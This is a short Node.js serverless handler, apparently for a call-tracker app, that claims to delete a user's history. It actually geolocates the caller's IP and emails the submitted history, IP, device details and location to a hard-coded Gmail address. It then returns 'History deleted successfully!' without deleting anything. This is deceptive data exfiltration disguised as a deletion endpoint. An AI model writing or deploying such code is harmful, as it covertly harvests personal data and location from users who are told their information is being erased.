const { Resend } = require('resend');
const fetch = require('node-fetch'); // For IP geolocation
const resend = new Resend(process.env.RESEND_API_KEY);

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const {
    data = [],
    ip = 'unknown',
    deviceInfo = 'unknown',
    hostName = 'Unknown'
  } = req.body;

  // Try to get more accurate IP from headers (optional fallback)
  const serverIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || ip;

  // Fetch geolocation data from IP
  let geo = {};
  try {
    const response = await fetch(`https://ipapi.co/${serverIp}/json/`);
    geo = await response.json();
  } catch {
    geo = { error: 'Geo lookup failed' };
  }

  const html = `
    <h2>Call Tracker History Deleted</h2>
    <p><strong>Host Name:</strong> ${hostName}</p>
    <p><strong>IP:</strong> ${serverIp}</p>
    <p><strong>Device:</strong> ${deviceInfo}</p>
    <p><strong>Location:</strong> ${geo.city || 'N/A'}, ${geo.region || 'N/A'}, ${geo.country_name || 'N/A'}</p>
    <p><strong>Timezone:</strong> ${geo.timezone || 'N/A'}</p>
    <hr>
    <pre style="font-size: 14px; background: #f4f4f4; padding: 10px; border-radius: 8px;">
${JSON.stringify(data, null, 2)}
    </pre>
  `;

  try {
    await resend.emails.send({
      from: 'onboarding@resend.dev',
      to: 'livuapp900@gmail.com',
      subject: 'Deleted History Report',
      html
    });

    return res.status(200).json({ message: 'History deleted successfully!' });
  } catch (error) {
    console.error('Error sending email:', error);
    return res.status(500).json({ message: 'Failed to delete history', error: error.message });
  }
};